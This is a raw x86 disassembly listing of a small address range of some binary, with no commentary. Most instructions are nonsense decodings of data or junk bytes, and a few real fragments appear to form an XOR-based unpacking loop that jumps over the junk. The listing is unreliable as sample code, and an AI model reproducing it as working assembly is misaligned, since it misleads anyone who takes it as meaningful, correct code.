  40c884:	retf   
  40c885:	(bad)  
  40c887:	jb     0x40c835
  40c889:	mov    ah,0x9d
  40c88b:	dec    ebp
  40c88c:	inc    esp
  40c88d:	jbe    0x40c8c9
  40c88f:	xor    al,0x3f
  40c891:	out    dx,al
  40c892:	jmp    0xc1a1:0xbd41bce1
  40c899:	test   al,0x25
  40c89b:	xlat   BYTE PTR ds:[ebx]
  40c89c:	cld    
  40c89d:	add    eax,0xa3394513
  40c8a2:	dec    esp
  40c8a3:	xchg   ebp,eax
  40c8a4:	gs popa 
  40c8a6:	mov    ah,0xae
  40c8a8:	add    ebp,esi
  40c8aa:	inc    eax
  40c8ac:	adc    BYTE PTR ds:0x1cdd7dcd,bl
  40c8b2:	out    dx,al
  40c8b3:	xchg   DWORD PTR [esi-0x79],eax
  40c8b6:	xchg   edx,eax
  40c8b7:	cmp    eax,DWORD PTR [ebp-0x71b70719]
  40c8bd:	cmp    ecx,DWORD PTR [edx]
  40c8bf:	pop    ebp
  40c8c0:	add    eax,eax
  40c8c2:	cmp    bh,dl
  40c8c4:	cmp    BYTE PTR [eax],0xfa
  40c8c7:	dec    esi
  40c8c8:	inc    edx
  40c8c9:	loope  0x40c876
  40c8cb:	dec    edx
  40c8cc:	push   ebp
  40c8cd:	add    eax,ebp
  40c8cf:	fcom   DWORD PTR [eax+eax*4]
  40c8d2:	adc    ebp,DWORD PTR [ebp+0x36fbac3c]
  40c8d8:	mov    ds:0x8239c21c,al
  40c8dd:	cmp    al,0x55
  40c8df:	jnp    0x40c8a4
  40c8e1:	ror    al,0x37
  40c8e4:	jb     0x40c8d2
  40c8e6:	add    eax,0x2163273
  40c8eb:	xchg   edx,eax
  40c8ec:	push   edx
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	repnz push esp
  40c91a:	pop    edx
  40c91b:	popa   
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c922
  40c925:	mov    ch,0xe7
  40c927:	bound  ebx,QWORD PTR [esi+0x33]
  40c92a:	xor    BYTE PTR [ecx],dh
  40c92c:	mov    eax,0xc206765f
  40c931:	mov    ch,0xc
  40c933:	mov    ch,bh
  40c935:	clc    
  40c936:	pop    ebx
  40c937:	repnz mov cs,WORD PTR [ebx+0x4dca6390]
  40c93e:	sub    BYTE PTR [edx+0xef8cf97],cl
  40c944:	outs   dx,DWORD PTR ds:[esi]
  40c945:	adc    BYTE PTR [edx+0x3d],0x18
  40c949:	mov    ebp,DWORD PTR [ebx-0x2]
  40c94c:	mov    ebx,0x255fe358
  40c951:	cmp    dh,dh
  40c953:	add    bl,BYTE PTR [esi-0x31]
  40c956:	sar    ah,cl
  40c958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c959:	xor    al,0xe6
  40c95b:	inc    esi
  40c95c:	ret    0x6e66
  40c95f:	pop    fs
  40c961:	int3   
  40c962:	jne    0x40c91d
  40c964:	ja     0x40c921
  40c966:	jnp    0x40c92c
  40c968:	fcmove st,st(2)
  40c96a:	mov    BYTE PTR [ecx],al
  40c96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c96d:	ffreep st(5)
  40c96f:	in     al,dx
  40c970:	and    eax,DWORD PTR [ebx-0x1e]
  40c973:	and    eax,0x2a31e866
  40c978:	push   esp
  40c979:	mov    eax,ds:0x7ea6f093
  40c97e:	sti    
  40c97f:	sbb    eax,0x1e8f28ff
  40c984:	leave  
  40c985:	sar    DWORD PTR [esi+0x17],1
  40c988:	mov    dh,0xb6
  40c98a:	xchg   edi,eax
  40c98b:	mov    edx,0x7bdb2be7
  40c990:	xchg   DWORD PTR [eax-0x7a53b375],ebp
  40c996:	xchg   dh,dh
  40c998:	mov    ch,0x45
  40c99a:	mov    ds:0x6bf179c,eax
  40c99f:	and    BYTE PTR [edx+edx*8],cl
  40c9a2:	lds    ebx,FWORD PTR [ecx-0x6e4422a3]
  40c9a8:	sbb    ch,BYTE PTR [edi+edi*2+0x5cc8d69e]
  40c9af:	retf   
  40c9b0:	push   cs
  40c9b1:	sbb    dl,BYTE PTR [edi]
  40c9b3:	sub    ecx,edi
  40c9b5:	into   
  40c9b6:	jp     0x40c9d9
  40c9b8:	std    
  40c9b9:	fadd   QWORD PTR [edi-0x6a]
  40c9bc:	out    dx,al
  40c9bd:	mov    dl,0xcb
  40c9c0:	jae    0x40c9f4
  40c9c2:	push   ds
  40c9c3:	mov    dl,0xe7
  40c9c5:	lea    esp,[esp+edx*4+0x611084ee]
  40c9cc:	push   sp
  40c9ce:	push   edi
  40c9cf:	mov    ds:0x216cd011,eax
  40c9d4:	mov    bh,0x1d
  40c9d6:	jne    0x40ca26
  40c9d8:	mov    ecx,0x644f93b0
  40c9dd:	mov    eax,ds:0x437be4a8
  40c9e2:	retf   0xe068
  40c9e5:	clc    
  40c9e6:	mov    esp,0x9b98f90e
  40c9eb:	and    BYTE PTR [ecx+0x4b],cl
  40c9ee:	loop   0x40c9a3
  40c9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9f1:	adc    bl,BYTE PTR [eax]
  40c9f3:	xchg   BYTE PTR [edx+0x33],dl
  40c9f6:	push   ss
  40c9f7:	jecxz  0x40c9fb
  40c9f9:	jge    0x40c9b7
  40c9fb:	aas    
  40c9fc:	or     bl,bh
  40c9fe:	sar    DWORD PTR [edi],cl
  40ca00:	shl    DWORD PTR [esi],1
  40ca02:	ins    BYTE PTR es:[edi],dx
  40ca03:	mov    eax,0x5421f009
  40ca08:	dec    edx
  40ca09:	data16 xor ch,BYTE PTR ds:0x9e69bacc
  40ca10:	add    DWORD PTR [esi-0x27],ebp
  40ca13:	fcom   QWORD PTR cs:[ecx]
  40ca16:	xchg   ebx,eax
  40ca17:	into   
  40ca18:	inc    ebp
  40ca19:	jecxz  0x40ca42
  40ca1b:	add    eax,DWORD PTR [edi+0x45]
  40ca1e:	add    eax,DWORD PTR [ebp-0x32bdf]
  40ca24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca25:	out    dx,eax
  40ca26:	fwait
  40ca27:	push   ebp
  40ca28:	jae    0x40c9b5
  40ca2a:	jle    0x40c9bf
  40ca2c:	push   eax
  40ca2d:	mov    ebx,0x6b69466
  40ca32:	les    ecx,FWORD PTR [edi]
  40ca34:	sub    DWORD PTR [ebp+0x1c],esi
  40ca37:	das    
  40ca38:	test   eax,0xb4861452
  40ca3d:	ror    BYTE PTR [edi-0x1d5777e6],1
  40ca43:	pushf  
  40ca44:	add    eax,0x2716f23d
  40ca49:	jo     0x40cab6
  40ca4b:	inc    BYTE PTR [edx+0x5d]
  40ca4e:	lahf   
  40ca4f:	(bad)  
  40ca50:	mov    ch,0xc
  40ca52:	jecxz  0x40ca6e
  40ca54:	pop    ecx
  40ca55:	mov    ecx,0x2345a4ef
  40ca5a:	adc    dl,BYTE PTR [ecx-0x20]
  40ca5d:	ss push ebp
  40ca5f:	push   0xffffff89
  40ca61:	inc    bh
  40ca63:	push   ecx
  40ca64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca65:	shl    BYTE PTR [esi+ecx*2+0x3c626b14],0x3a
  40ca6d:	loopne 0x40ca3c
  40ca6f:	dec    ebx
  40ca70:	or     BYTE PTR [eax-0x7976a9d],bl
  40ca76:	pop    ds
  40ca77:	lds    esi,FWORD PTR [eax+edx*1]
  40ca7a:	mov    cl,0xbb
  40ca7c:	push   ss
  40ca7d:	idiv   DWORD PTR [esi-0x3049b982]
  40ca83:	inc    esi
  40ca84:	mov    esp,edi
  40ca86:	leave  
  40ca87:	fwait
  40ca88:	or     al,BYTE PTR [ecx-0x6cb72988]
  40ca8e:	pop    ebp
  40ca8f:	(bad)  
  40ca90:	jmp    0x304c:0x6ff9daf8
  40ca97:	xchg   edi,eax
  40ca98:	std    
  40ca99:	sbb    al,0x15
  40ca9b:	add    eax,DWORD PTR [eax-0x43]
  40ca9e:	mov    esp,0x3380bbe7
  40caa3:	xchg   edi,eax
  40caa4:	lahf   
  40caa5:	xor    eax,0x72069671
  40caaa:	push   0xe53d9c78
  40caaf:	je     0x40cada
  40cab1:	mov    DWORD PTR [edi-0x52],esi
  40cab4:	hlt    
  40cab5:	ins    BYTE PTR es:[edi],dx
  40cab6:	xchg   edi,eax
  40cab7:	imul   edi,DWORD PTR [edx],0xffffff8e
  40caba:	pop    edx
  40cabb:	cmp    bl,bl
  40cabd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cabe:	xchg   BYTE PTR [esi+eiz*4],dh
  40cac1:	jno    0x40ca63
  40cac3:	loop   0x40ca93
  40cac5:	and    eax,0x794412dd
  40caca:	or     eax,0xd99ac5d5
  40cacf:	sub    dl,dh
  40cad1:	jmp    0x49e3:0x8058a793
  40cad8:	lods   al,BYTE PTR ds:[esi]
  40cad9:	pusha  
  40cada:	mov    eax,ds:0xba839af3
  40cadf:	je     0x40cb0c
  40cae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae2:	add    al,0x39
  40cae4:	xor    al,0x3d
  40cae6:	fild   WORD PTR [ecx-0x25]
  40cae9:	jne    0x40cada
  40caeb:	aad    0x1e
  40caed:	popa   
  40caee:	inc    ebp
  40caef:	pop    ebx
  40caf0:	xchg   ebx,eax
  40caf1:	jo     0x40cb08
  40caf3:	mov    esi,0xc720b45a
  40caf8:	mov    ebp,0x1ba7e7d4
  40cafd:	add    al,0xa3
  40caff:	mov    ss,ecx
  40cb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb02:	loopne 0x40ca88
  40cb04:	and    DWORD PTR [ecx+ebp*4],ebp
  40cb07:	jecxz  0x40cb4f
  40cb09:	into   
  40cb0a:	dec    ebp
  40cb0b:	xchg   esp,eax
  40cb0c:	adc    edi,ebp
  40cb0e:	inc    esp
  40cb0f:	sbb    al,0xe9
  40cb11:	mov    ebp,0x3fbe6965
  40cb16:	bound  ecx,QWORD PTR fs:[ebp-0x6d]
  40cb1a:	fucomp st(6)
  40cb1c:	shl    BYTE PTR [ebx+0x4a],cl
  40cb1f:	xchg   esp,eax
  40cb20:	push   edi
  40cb21:	push   bp
  40cb23:	pop    edx
  40cb24:	ds leave 
  40cb26:	ins    BYTE PTR es:[edi],dx
  40cb27:	jb     0x40cb0d
  40cb29:	int    0x75
  40cb2b:	loopne 0x40cb26
  40cb2d:	fmul   QWORD PTR [ebx+0x61696283]
  40cb33:	je     0x40cade
  40cb35:	add    DWORD PTR [ecx+0xf],edi
  40cb38:	or     eax,0xe4239a9a
  40cb3d:	xchg   esp,eax
  40cb3e:	test   eax,0x59419d7f
  40cb43:	mov    ebp,0x6f841826
  40cb48:	mov    ah,BYTE PTR [ebx+0x71]
  40cb4b:	rcl    ch,0xfa
  40cb4e:	test   eax,0x624e054a
  40cb53:	push   ebx
  40cb54:	and    dh,BYTE PTR [ebx]
  40cb56:	jb     0x40cba6
  40cb58:	sbb    DWORD PTR ds:0x51e89f72,edx
  40cb5e:	call   FWORD PTR [edx]
  40cb60:	stc    
  40cb61:	lods   eax,DWORD PTR ds:[esi]
  40cb62:	xchg   ecx,eax
  40cb63:	shl    BYTE PTR [edx+0x73],cl
  40cb66:	xor    DWORD PTR [ecx+0x48],0x8a0fb6d1
  40cb6d:	dec    esp
  40cb6e:	xchg   BYTE PTR [esi+0x4f13a3ec],dh
  40cb74:	out    dx,al
  40cb75:	es jg  0x40cb0f
  40cb78:	mov    edx,DWORD PTR [ebx-0x62]
  40cb7b:	push   ebx
  40cb7c:	and    ecx,DWORD PTR [eax+0x13893690]
  40cb82:	rol    BYTE PTR [ebp+0x6dfc9796],cl
  40cb88:	sub    ecx,esp
  40cb8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb8b:	pop    esp
  40cb8c:	xor    DWORD PTR [esi+0x27e5f4b9],eax
  40cb92:	sub    dl,BYTE PTR [edx+0x1e633c0b]
  40cb98:	sbb    ebx,DWORD PTR fs:[ebx+0x56]
  40cb9c:	mov    eax,0x1485beda
  40cba1:	mov    dh,0x6
  40cba3:	and    eax,0xaacf83cd
  40cba8:	fcom   DWORD PTR [ebx-0x38]
  40cbab:	inc    ecx
  40cbac:	pop    ebx
  40cbad:	mov    edx,0x33a854cb
  40cbb2:	dec    esp
  40cbb3:	out    0xf,al
  40cbb5:	adc    DWORD PTR [edi],0xc
  40cbb8:	mov    bl,BYTE PTR ds:0x91dcfd2
  40cbbe:	jecxz  0x40cbd4
  40cbc0:	jae    0x40cbf3
  40cbc2:	mov    eax,ds:0xa876651a
  40cbc7:	jg     0x40cb68
  40cbc9:	cdq    
  40cbca:	into   
  40cbcb:	js     0x40cbf2
  40cbcd:	movd   DWORD PTR ds:[eax+0x29],mm1
  40cbd2:	sbb    ah,BYTE PTR ds:[eax+0x4232b529]
  40cbd9:	push   esp
  40cbda:	lods   al,BYTE PTR ds:[esi]
  40cbdb:	mov    edx,0x5ca09770
  40cbe0:	outs   dx,BYTE PTR ds:[esi]
  40cbe1:	pop    ds
  40cbe2:	dec    ebx
  40cbe3:	sbb    dl,bl
  40cbe5:	mov    bl,0x52
  40cbe7:	and    DWORD PTR [ebx],esi
  40cbe9:	pop    ebx
  40cbea:	adc    ebx,DWORD PTR [esi-0x56]
  40cbed:	xchg   ebx,eax
  40cbee:	daa    
  40cbef:	sub    eax,0xaad5ef92
  40cbf4:	sub    bl,BYTE PTR [edx-0x37]
  40cbf7:	lock adc esi,esp
  40cbfa:	cmp    DWORD PTR [ebp+esi*2+0xfd920b6],ebp
  40cc01:	lods   eax,DWORD PTR ds:[esi]
  40cc02:	sbb    eax,0xbe05da3b
  40cc07:	repnz fdivr DWORD PTR [esi+ecx*2-0x76]
  40cc0c:	adc    eax,0x5f3c471
  40cc11:	pop    edx
  40cc12:	mov    ch,BYTE PTR [eax+0x39]
  40cc15:	adc    DWORD PTR [ebx+0x1229a7a0],edi
  40cc1b:	mov    al,0xc9
  40cc1d:	push   eax
  40cc1e:	out    0xa0,eax
  40cc20:	aam    0x8a
  40cc22:	mov    ah,0xdf
  40cc25:	xor    eax,0xfa40f41f
  40cc2a:	mov    ch,0x5c
  40cc2c:	frstor [eax]
  40cc2e:	int    0x75
  40cc30:	sbb    eax,DWORD PTR [esi-0x7ddfd75d]
  40cc36:	inc    ecx
  40cc37:	imul   esp,DWORD PTR [edi+eax*2-0x1d25d6f5],0xffffffc1
  40cc3f:	dec    esp
  40cc40:	fs xchg esp,eax
  40cc42:	repnz loop 0x40cc82
  40cc45:	fstp   st(6)
  40cc47:	cs cld 
  40cc49:	xchg   DWORD PTR [edi+0x2173c299],edx
  40cc4f:	jl     0x40cbf1
  40cc51:	imul   ebp,esp,0x998cadba
  40cc57:	loopne 0x40ccc1
  40cc59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc5a:	rol    BYTE PTR [edi+0x16],1
  40cc5d:	mov    eax,ds:0x91cd447a
  40cc62:	hlt    
  40cc63:	inc    DWORD PTR [esp+ebp*2-0x4d]
  40cc67:	in     al,dx
  40cc68:	imul   esi,esi,0x6b
  40cc6b:	and    al,0x2c
  40cc6d:	pop    esp
  40cc6e:	lahf   
  40cc6f:	ss ss inc edx
  40cc72:	test   eax,0x42c632e8
  40cc77:	repnz int3 
  40cc79:	aas    
  40cc7a:	xchg   esp,eax
  40cc7b:	adc    eax,0x23445d9c
  40cc80:	(bad)  [eax+edx*8+0xa]
  40cc84:	or     esi,DWORD PTR [edi+ebp*4]
  40cc87:	ss retf 0xe609
  40cc8b:	loopne 0x40ccb6
  40cc8d:	repnz aam 0xe9
  40cc90:	inc    esi
  40cc91:	out    0x6d,al
  40cc93:	and    dh,BYTE PTR [edi+0x1e]
  40cc96:	enter  0x43c5,0xf2
  40cc9a:	cmp    dh,dh
  40cc9c:	cs add eax,0x78b1ffa5
  40cca2:	push   ecx
  40cca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cca4:	sbb    BYTE PTR [esi-0x509a6e58],ch
  40ccaa:	out    0x21,al
  40ccac:	je     0x40cd16
  40ccae:	xor    al,0xd
  40ccb0:	in     al,0xc8
  40ccb2:	or     al,0x9a
  40ccb4:	cli    
  40ccb5:	(bad)  
  40ccb6:	cmp    DWORD PTR [ecx-0x78],esp
  40ccb9:	add    DWORD PTR [edx+0x6befaf7],0xb706d297
  40ccc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccc4:	add    BYTE PTR [ebx],dh
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	cmp    edi,0xd
  40cd18:	lds    ecx,FWORD PTR [eax+0xb]
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccbc
  40cd23:	add    eax,DWORD PTR [eax+0x5e]
  40cd26:	mov    ds:0x3219c2ce,eax
  40cd2b:	and    cl,BYTE PTR [esp+ebx*2]
  40cd2e:	out    0x3d,al
  40cd30:	rcr    BYTE PTR [esi+0x4ee81ace],1
  40cd36:	xchg   DWORD PTR [eax+0x6d121504],edx
  40cd3c:	xchg   ebx,eax
  40cd3d:	mov    eax,ds:0x25ed994
  40cd42:	int    0x64
  40cd44:	jno    0x40cd33
  40cd46:	fwait
  40cd47:	(bad)  
  40cd48:	or     al,0x91
  40cd4a:	cmc    
  40cd4b:	cld    
  40cd4c:	fiadd  DWORD PTR [ebx-0xf]
  40cd4f:	jp     0x40cd42
  40cd51:	idiv   cl
  40cd53:	jns    0x40cce5
  40cd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd56:	lods   eax,DWORD PTR ds:[esi]
  40cd57:	mov    dh,0x55
  40cd59:	and    DWORD PTR [eax-0x80],edi
  40cd5c:	mov    eax,ds:0x87ed8833
  40cd61:	mov    WORD PTR [edx],ds
  40cd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd64:	and    eax,0xa361f4c9
  40cd69:	xchg   DWORD PTR [eax+edi*1],esi
  40cd6c:	pop    ebx
  40cd6d:	jno    0x40cd22
  40cd6f:	retf   0x4df0
  40cd72:	pop    edx
  40cd73:	mov    cl,0x77
  40cd75:	xor    al,0x27
  40cd77:	push   edx
  40cd78:	jmp    0xaedf9292
  40cd7d:	or     BYTE PTR [ecx+ebx*8+0x48],bl
  40cd81:	mov    ebp,DWORD PTR [ecx-0xe]
  40cd84:	push   esi
  40cd85:	or     al,0x63
  40cd87:	test   eax,0x55582ec1
  40cd8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd8d:	sub    BYTE PTR [edx+0x7e],0xc8
  40cd91:	mov    edi,0x6985beed
  40cd96:	mov    gs,edi
  40cd98:	xchg   ebx,eax
  40cd99:	aam    0xb9
  40cd9b:	push   esp
  40cd9c:	push   ds
  40cd9d:	fs pop ss
  40cd9f:	sub    al,0x45
  40cda1:	rdpmc  
  40cda3:	mov    cs,WORD PTR [edi+eiz*2-0x1b]
  40cda7:	retf   0x8f8
  40cdaa:	xor    ax,0x1db8
  40cdae:	cmp    bl,BYTE PTR [ebx-0x47c34d2b]
  40cdb4:	std    
  40cdb5:	or     BYTE PTR [edi+0x16],ch
  40cdb8:	mov    ds:0xbae7d48c,eax
  40cdbd:	in     eax,dx
  40cdbe:	addr16 nop
  40cdc0:	loop   0x40cdea
  40cdc2:	out    dx,al
  40cdc3:	xchg   edi,eax
  40cdc4:	stos   BYTE PTR es:[edi],al
  40cdc5:	jae    0x40ce44
  40cdc7:	mov    ah,BYTE PTR [ecx]
  40cdc9:	call   0x93b9bb9
  40cdce:	xchg   DWORD PTR [ecx],edx
  40cdd0:	cmp    ah,bl
  40cdd2:	(bad)  
  40cdd3:	push   esp
  40cdd4:	mov    edi,0x5e2ea71
  40cdd9:	das    
  40cdda:	push   cs
  40cddb:	xchg   edx,eax
  40cddc:	adc    BYTE PTR [eax+0x4e],bh
  40cddf:	into   
  40cde0:	scas   al,BYTE PTR es:[edi]
  40cde1:	jmp    0x40cdba
  40cde3:	pop    ds
  40cde4:	dec    eax
  40cde5:	cmp    DWORD PTR [eax],ecx
  40cde7:	jnp    0x40cdec
  40cde9:	pop    eax
  40cdea:	cmp    ah,al
  40cdec:	push   edx
  40cded:	cmp    DWORD PTR [ecx-0x3b5c1a20],esi
  40cdf3:	push   cs
  40cdf4:	repz cmp eax,0x4549520b
  40cdfa:	(bad)  
  40cdfb:	stos   BYTE PTR es:[edi],al
  40cdfc:	adc    bl,BYTE PTR [ebx-0x3825ecb]
  40ce02:	mov    bl,BYTE PTR [edi+eax*1+0x268aa1f]
  40ce09:	adc    esi,DWORD PTR [eax+0x3d]
  40ce0c:	cmp    eax,0xba0809cd
  40ce11:	xor    dh,BYTE PTR [esp+eiz*8-0x3e]
  40ce15:	mov    BYTE PTR [esi+0x73f6cfde],ch
  40ce1b:	pop    esp
  40ce1c:	push   cs
  40ce1d:	and    BYTE PTR [esi],ch
  40ce1f:	cmp    dl,BYTE PTR ds:0x8cd66e24
  40ce25:	rol    cl,cl
  40ce27:	dec    edi
  40ce28:	pop    ecx
  40ce29:	xchg   esi,eax
  40ce2a:	sbb    al,0x3
  40ce2c:	dec    eax
  40ce2d:	lds    edi,FWORD PTR [edx+0x2696b120]
  40ce33:	sbb    eax,0x67d5555
  40ce38:	bound  esi,QWORD PTR [esi]
  40ce3a:	push   edx
  40ce3b:	pop    ds
  40ce3c:	mov    fs,WORD PTR [ebx]
  40ce3e:	(bad)  [ebp-0x6a5e1350]
  40ce44:	popa   
  40ce45:	mov    ah,0x92
  40ce47:	test   BYTE PTR [ecx-0x245692e2],ch
  40ce4d:	jl     0x40ceb6
  40ce4f:	push   ss
  40ce50:	cmp    BYTE PTR [esi-0x5e8b7c53],ch
  40ce56:	sbb    al,0x78
  40ce58:	pop    ds
  40ce59:	push   0xd8b4aa9a
  40ce5e:	pop    edx
  40ce5f:	fild   QWORD PTR [ecx+eax*4-0x30]
  40ce63:	(bad)  
  40ce64:	ins    BYTE PTR es:[di],dx
  40ce66:	push   ebx
  40ce67:	ins    BYTE PTR es:[edi],dx
  40ce68:	bound  esi,QWORD PTR [edi]
  40ce6a:	das    
  40ce6b:	les    ecx,FWORD PTR [ecx-0x54]
  40ce6e:	push   cs
  40ce6f:	ins    BYTE PTR es:[edi],dx
  40ce70:	cld    
  40ce71:	inc    eax
  40ce72:	mov    dl,0x38
  40ce74:	fidivr WORD PTR [esi+0x46]
  40ce77:	stos   BYTE PTR es:[edi],al
  40ce78:	cli    
  40ce79:	adc    al,0xbe
  40ce7b:	jmp    0x40cee8
  40ce7d:	jae    0x40cedd
  40ce7f:	xlat   BYTE PTR ds:[ebx]
  40ce80:	fcos   
  40ce82:	jge    0x40cea0
  40ce84:	jmp    FWORD PTR [edi-0x3b03e0d]
  40ce8a:	push   ss
  40ce8b:	test   DWORD PTR [ebx+0x53],eax
  40ce8e:	jbe    0x40cea2
  40ce90:	and    BYTE PTR [ebp-0x78],al
  40ce93:	retf   
  40ce94:	mov    bh,0x93
  40ce96:	out    0x47,al
  40ce98:	aas    
  40ce99:	in     al,0xb8
  40ce9b:	jecxz  0x40cf10
  40ce9d:	pop    ebx
  40ce9e:	les    esp,FWORD PTR [ebp+0x22]
  40cea1:	sub    BYTE PTR [edx+0x5f737e7a],dl
  40cea7:	dec    esi
  40cea8:	dec    ecx
  40cea9:	inc    ebx
  40ceaa:	adc    DWORD PTR [edi-0x25fee1cc],esp
  40ceb0:	and    DWORD PTR [esi-0x1842f0bf],esp
  40ceb6:	push   ss
  40ceb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb8:	add    al,0xb9
  40ceba:	(bad)  
  40cebb:	jg     0x40cf2a
  40cebd:	retf   0xfa8c
  40cec0:	adc    edi,DWORD PTR [edx+0x19c79fe6]
  40cec6:	add    bh,BYTE PTR [eax+esi*2+0x6a807dcf]
  40cecd:	fidiv  WORD PTR [eax]
  40cecf:	out    0x7b,eax
  40ced1:	in     eax,dx
  40ced2:	cld    
  40ced3:	(bad)  
  40ced4:	aaa    
  40ced5:	outs   dx,DWORD PTR ds:[esi]
  40ced6:	sub    al,0xfc
  40ced8:	jecxz  0x40ce92
  40ceda:	fiadd  WORD PTR [esi]
  40cedc:	iret   
  40cedd:	fcomip st,st(0)
  40cedf:	mov    eax,ds:0xe868e260
  40cee4:	retf   0x7da1
  40cee7:	gs call 0x3b98e0eb
  40ceed:	add    DWORD PTR ss:[edx-0x19],esi
  40cef1:	stc    
  40cef2:	push   esi
  40cef3:	inc    esp
  40cef4:	mov    edx,0xae85796f
  40cef9:	sbb    ecx,DWORD PTR [ebp+0x6d3ae27d]
  40ceff:	push   esp
  40cf00:	fnstenv [ebx+0x3f]
  40cf03:	add    eax,0x9e043fff
  40cf08:	adc    DWORD PTR [ebx],edi
  40cf0a:	imul   ebx,DWORD PTR [ecx+0x38],0xc164e7fb
  40cf11:	sbb    ecx,esi
  40cf13:	mov    edx,0x4a6a202f
  40cf18:	dec    eax
  40cf19:	xchg   edi,eax
  40cf1a:	das    
  40cf1b:	mov    edx,DWORD PTR [ecx+ebx*4]
  40cf1e:	std    
  40cf1f:	(bad)  
  40cf20:	cmp    esp,DWORD PTR [ecx-0x4c]
  40cf23:	jmp    FWORD PTR ds:0x5f33a00b
  40cf29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf2a:	fsubr  QWORD PTR [ecx-0x66]
  40cf2d:	cmp    al,0x89
  40cf2f:	inc    esp
  40cf30:	mov    gs,WORD PTR [ecx-0x48bd1b4]
  40cf36:	ret    0xd0b3
  40cf39:	ret    0xdeee
  40cf3c:	(bad)  
  40cf3d:	mov    dh,BYTE PTR [ebx+0x1f]
  40cf40:	lds    ebx,FWORD PTR [esi+0xd]
  40cf43:	sbb    al,0x83
  40cf45:	xor    eax,0xc540b290
  40cf4a:	add    ebp,edi
  40cf4c:	mov    cl,0xf9
  40cf4e:	data16 mov ch,0x6d
  40cf51:	pusha  
  40cf52:	sub    edi,0x2d2ed927
  40cf58:	mov    esp,0xc87041c7
  40cf5d:	xor    BYTE PTR [edx-0x250dfb5e],al
  40cf63:	mov    WORD PTR [eax-0x32],?
  40cf66:	js     0x40cfde
  40cf68:	cwde   
  40cf69:	jmp    0x83cc:0xd4f91233
  40cf70:	push   0x65a9c7ec
  40cf75:	aaa    
  40cf76:	xor    BYTE PTR [ebx],dl
  40cf78:	aaa    
  40cf79:	push   ss
  40cf7a:	xchg   ecx,eax
  40cf7b:	lods   al,BYTE PTR ds:[esi]
  40cf7c:	shl    DWORD PTR ds:[ebp+0x729a4614],cl
  40cf83:	sbb    al,0x56
  40cf85:	out    dx,al
  40cf86:	je     0x40cf9b
  40cf88:	out    dx,al
  40cf89:	sahf   
  40cf8a:	inc    ebp
  40cf8b:	(bad)  
  40cf8c:	jg     0x40cf46
  40cf8e:	sub    eax,0xd2a53798
  40cf93:	or     al,0xd1
  40cf95:	add    DWORD PTR [ecx+edx*2],eax
  40cf98:	sbb    cl,BYTE PTR [esi+0x446f6094]
  40cf9e:	(bad)  
  40cf9f:	sbb    al,0x8d
  40cfa1:	add    eax,0xdbedad11
  40cfa6:	clc    
  40cfa7:	jns    0x40cf5f
  40cfa9:	adc    BYTE PTR [eax],0xde
  40cfac:	push   ss
  40cfad:	lea    ebp,[eax+eiz*2-0x14]
  40cfb1:	ret    0x493e
  40cfb4:	mov    ds:0x17efc6a,eax
  40cfb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfba:	test   al,0x68
  40cfbc:	loope  0x40cf99
  40cfbe:	mov    ds:0x3ffd8b3b,eax
  40cfc3:	xchg   ecx,eax
  40cfc4:	push   cs
  40cfc5:	sti    
